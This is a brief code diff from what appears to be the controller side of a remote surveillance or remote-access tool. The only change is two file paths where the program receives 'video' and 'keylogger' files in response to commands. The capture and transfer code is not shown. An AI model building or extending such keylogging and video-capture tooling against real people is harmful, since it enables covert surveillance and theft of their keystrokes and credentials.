@@ -13,11 +13,11 @@ int main()
         client.SendCommand();
         if (client.command == "GET_VIDEO")
         {
-            client.ReceiveFile("../src/data/video");
+            client.ReceiveFile("../data/video");
         }
         else if(client.command == "GET_KEYLOGGER")
         {
-            client.ReceiveFile("../src/data/keylogger");
+            client.ReceiveFile("../data/keylogger");
         }
     }
 
